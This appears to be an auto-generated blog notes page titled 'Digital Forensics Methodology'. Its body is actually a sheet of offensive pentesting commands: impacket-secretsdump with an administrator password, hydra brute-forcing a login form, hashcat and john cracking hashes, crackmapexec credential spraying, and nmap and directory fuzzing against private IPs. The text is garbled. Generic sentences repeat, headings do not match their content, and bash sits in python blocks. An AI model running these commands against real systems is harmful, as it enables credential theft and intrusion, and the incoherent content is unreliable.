---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, privilege escalation, persistence, networking, malware"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-165.html"
URL_IMAGES: ""
Date: "2025-04-23"
Tags: "Blue Team, Privilege Escalation, Persistence, Networking, Malware"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-165"
Permalink: "/notes/note-digital-forensics-methodology-165.html"
BtnLabel: "Read Notes"
Pick: 0
---
## .NET

### CSRF

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.59.41
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.72.250.233/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## john

### hydra

```bash
nmap -sCV -p1433,139,636 10.69.47.105 -oN scan.txt
gobuster dir -u http://10.16.183.9/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.51.84.249
```

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.105.161/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.209.254 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.22.110.197 -u administrator -p 'P@ssw0rd!' --shares
```

```python
feroxbuster -h
crackmapexec smb 10.91.57.113 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.92.32.191 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.83.47.76/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

## Python

### secretsdump

- `SQL Injection`
- `IDOR`
- `chisel`

- `LXD Privilege Escalation`
- `DCSync`
- `SeDebugPrivilege`
- `Command Injection`

## AS-REP Roasting

### MySQL

```bash
nmap -sCV -p3268,139,993 10.39.169.219 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.101.242/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

- `SQL Injection`
- `Weak Service Permissions`
- `wmiexec`
